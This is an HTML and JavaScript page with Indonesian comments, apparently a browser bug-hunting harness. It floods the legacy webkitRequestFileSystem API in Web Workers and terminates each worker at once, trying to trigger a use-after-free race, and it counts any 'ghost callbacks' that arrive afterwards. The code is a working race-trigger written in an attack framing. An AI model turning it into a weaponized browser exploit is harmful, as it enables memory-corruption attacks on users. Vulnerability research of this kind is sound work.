<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FileSystem UAF Aggressive Stress Test</title>
    <style>
        body { font-family: 'Consolas', monospace; background: #000; color: #0f0; padding: 10px; }
        #log { height: 60vh; overflow-y: scroll; border: 1px solid #333; background: #111; padding: 5px; font-size: 11px; }
        .crit { color: #f0f; font-weight: bold; }
        .err { color: #f00; }
        .warn { color: #ff0; }
        .info { color: #0ff; }
        #overlay { position: fixed; top: 10px; right: 10px; background: #222; padding: 10px; border: 1px solid #f00; }
    </style>
</head>
<body>
    <h1>ðŸ”¬ Aggressive Worker FileSystem UAF Stress Test</h1>
    <p>Strategi: Flood IPC Queue â†’ Immediate Double Destroy (Terminate + Remove)</p>
    
    <div id="overlay">
        <div>Count: <span id="count">0</span></div>
        <div>Callbacks: <span id="cbs">0</span></div>
        <div>Status: <span id="status" class="warn">READY</span></div>
    </div>

    <button onclick="startStress()">START STRESS</button>
    <button onclick="stopStress()">STOP</button>
    <button onclick="document.getElementById('log').innerHTML=''">CLEAR</button>

    <div id="log"></div>

    <!-- WORKER SCRIPT -->
    <script id="worker-src" type="javascript/worker">
        // Non-standar API, harus dibungkus try-catch agar worker tidak langsung mati saat error
        try {
            if (self.webkitRequestFileSystem) {
                self.onmessage = function(e) {
                    // Loop internal worker untuk membanjiri antrean IPC
                    // Kita kirim banyak request sekaligus sebelum worker sempat diproses terminasi
                    for (let i = 0; i < 5; i++) {
                        try {
                            self.webkitRequestFileSystem(
                                self.TEMPORARY, 
                                1024 * 1024, // 1MB request (meminta alokasi)
                                function(fs) {
                                    // CRITICAL ZONE: Jika ini muncul setelah parent post 'DIE',
                                    // berarti callback berjalan di context yang sedang/ sudah hancur.
                                    self.postMessage({ type: 'GHOST_CALLBACK', name: fs.name });
                                },
                                function(err) { /* ignore */ }
                            );
                        } catch(e) {}
                    }
                };
            } else {
                self.postMessage({ type: 'LOG', msg: 'API NOT SUPPORTED', class: 'err' });
            }
        } catch(e) {
            self.postMessage({ type: 'LOG', msg: 'INIT ERROR: ' + e.message, class: 'err' });
        }
    </script>

    <script>
        let running = false;
        let count = 0;
        let cbs = 0;
        let workerBlob = null;
        let workerUrl = null;

        const logDiv = document.getElementById('log');
        const countEl = document.getElementById('count');
        const cbsEl = document.getElementById('cbs');
        const statusEl = document.getElementById('status');

        function log(msg, cls = '') {
            const d = document.createElement('div');
            d.className = cls;
            d.textContent = `> ${msg}`;
            logDiv.appendChild(d);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function init() {
            if (workerUrl) return;
            const code = document.getElementById('worker-src').textContent;
            workerBlob = new Blob([code], { type: 'application/javascript' });
            workerUrl = URL.createObjectURL(workerBlob);
            
            // Cek ketersediaan API di main thread juga
            if (!window.webkitRequestFileSystem) {
                log("PERINGATAN: webkitRequestFileSystem tidak ditemukan di Main Thread.", "warn");
                log("Browser modern mungkin memblokir API ini. Coba Chrome < 100 atau flag khusus.", "warn");
            }
        }

        function startStress() {
            if (running) return;
            init();
            running = true;
            statusEl.textContent = "ATTACKING";
            statusEl.className = "crit";
            log("Memulai Stress Test...", "info");
            stressLoop();
        }

        function stopStress() {
            running = false;
            statusEl.textContent = "STOPPED";
            statusEl.className = "err";
            log("Dihentikan.", "warn");
        }

        function stressLoop() {
            if (!running) return;

            // Batch attack: Buat 10 worker per frame untuk membebani scheduler
            for (let i = 0; i < 10; i++) {
                spawnKillerWorker();
            }

            count += 10;
            countEl.textContent = count;
            
            // Gunakan requestAnimationFrame untuk sinkronisasi dengan refresh rate browser
            // Ini sering menciptakan timing yang lebih "pas" untuk race condition daripada setTimeout
            requestAnimationFrame(stressLoop);
        }

        function spawnKillerWorker() {
            const w = new Worker(workerUrl);
            
            // Listener untuk mendeteksi "Ghost Callback"
            w.onmessage = function(e) {
                const d = e.data;
                if (d.type === 'GHOST_CALLBACK') {
                    cbs++;
                    cbsEl.textContent = cbs;
                    log(`âš ï¸ GHOST CALLBACK DETECTED! FS: ${d.name}`, "crit");
                    // Ini adalah indikasi kuat bug lifecycle
                } else if (d.type === 'LOG') {
                    log(d.msg, d.class);
                }
            };

            // 1. Kirim perintah kerja (Memasukkan task ke antrean IPC)
            w.postMessage({ action: 'flood' });

            // 2. HANCURKAN SEGERA (Tanpa delay)
            // Kita paksa thread worker berhenti seketika
            w.terminate();
            
            // 3. Hapus referensi agar GC segera mengambil alih
            // Ini penting untuk memastikan objek C++ terkait worker di-mark untuk deletion
            // w = null; 
        }

        // Logging awal
        log("Siap. Tekan START.", "info");
    </script>
</body>
</html>
